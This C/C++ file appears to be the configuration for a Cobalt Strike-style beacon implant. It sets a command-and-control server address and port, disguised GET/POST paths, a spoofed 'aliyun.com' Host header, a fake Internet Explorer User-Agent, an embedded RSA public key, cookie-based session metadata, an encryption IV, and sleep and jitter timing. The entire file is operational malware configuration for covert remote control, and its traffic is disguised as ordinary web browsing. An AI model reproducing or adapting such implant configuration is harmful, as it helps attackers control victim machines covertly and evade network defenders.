#include "Config.h"
#include <Windows.h>

const wchar_t* server = L"192.168.86.132";
const wchar_t* get_path = L"/www/handle/doc";
const wchar_t* post_path = L"/IMXo";
INTERNET_PORT port = 8011;
const wchar_t* host_header = L"Host: aliyun.com\r\n";
const wchar_t* user_agent_header = L"User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; BOIE9; ENUS)\r\n";
const wchar_t* server_header = L"Server: nginx\r\n";
const wchar_t* content_type_header = L"Content-Type: application/x-www-form-urlencoded\r\n";

char* pub_key_str = "-----BEGIN PUBLIC KEY-----\n"
"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDFuBEComVxOz5p5SxyMblUbjMZ\n"
"CsRNHiIIPd7BS4saKfD1wf3j9ItmpUzbvpv1OnkCoi3nerrF2br9BMkRPN3oZYI6\n"
"49ppquLXVRpc0n9bQBxl2JmhNBjkw5ep2GhB2nBp/tTZZe5kUjSfDcI+QpDhLHHo\n"
"4wFttHQVpUpl3jZ1lwIDAQAB\n"
"-----END PUBLIC KEY-----\n";

const char* metadata_prepend = "SESSIONID=";
const char* metadata_header = "Cookie:";
const char* Response_prepend = "data=";
const char* Response_append = "%%";
const char* Http_post_id_prepend = "user=";
const char* Http_post_id_append = "%%";
const char* Http_post_client_output_prepend = "data=";
const char* Http_post_client_output_append = "%%";
const char* header = "User:";
const char netbiosKey = 'A';
const char IV[] = "abcdefghijklmnop";
int SleepTime = 5000;
int jitter = 100;
int Counter = 0;

